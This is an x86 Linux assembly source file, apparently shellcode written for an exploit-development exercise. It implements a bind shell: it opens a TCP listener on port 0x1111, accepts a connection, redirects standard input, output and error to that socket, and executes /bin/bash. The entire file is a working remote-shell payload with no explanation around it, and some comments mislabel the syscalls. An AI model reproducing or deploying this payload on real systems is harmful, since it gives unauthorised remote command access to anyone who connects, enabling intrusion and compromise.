global _start

section .text

_start:

	; socket()
	mov al, 0x66	; sys_socketcall
	mov bl, 0x1		; SYS_SOCKET
	push 0x6		; IPPROTO_TCP
	push 0x1		; SOCK_STREAM
	push 0x2		; AF_INET
	mov ecx, esp
	int 0x80		; sys_socketcall (SYS_SOCKET)
	mov edi, eax	; save socket fd value

	; prepare inet_addr struct
	push edx		; padding
	push edx		; padding
	push edx		; sin.addr
	push word 0x1111		; Port
	push word 0x2			; AF_INET
	mov esi, esp

	; bind()
	mov al, 0x66	; sys_socketcall
	mov bl, 0x2		; SYS_BIND
	push 0x10		; size of sockaddr
	push esi		; pointer to sockaddr
	push edi		; saved sock fd value
	mov ecx, esp
	int 0x80

	; listen()
	mov al, 0x66	; sys_socketcall
	mov bl, 0x4		; SYS_LISTEN
	push 0x10		; queue len	
	push edi		; saved sock fd value 
	mov ecx, esp
	int 0x80		; sys_socketcall (SYS_LISTEN)

	; accept()
	mov al, 0x66	; sys_socketcall
	mov bl, 0x5		; SYS_ACCEPT
	push edx
	push edx
	push edi		; saved sock fd value
	mov ecx, esp
	int 0x80	 	; sys_socketcall (SYS_ACCEPT)
	mov edi, eax

	; dup2()
	xor ecx, ecx
	mov al, 0x3f
	mov ebx, edi
	int 0x80		; sys_socketcall

	; dup2()
	inc ecx
	mov al, 0x3f
	mov ebx, edi
	int 0x80		; sys_socketcall

	; dup2()
	inc ecx
	mov al, 0x3f
	mov ebx, edi
	int 0x80		; sys_socketcall

	; execve()
	xor eax, eax
	push 0x41687361	; ///bin/bash+/x00
	push 0x622f6e69
	push 0x622f2f2f
	mov byte [esp + 11], al
	mov al, 0xb
	mov ebx, esp
	xor ecx, ecx 
	xor edx, edx
	int 0x80		; sys_socketcall
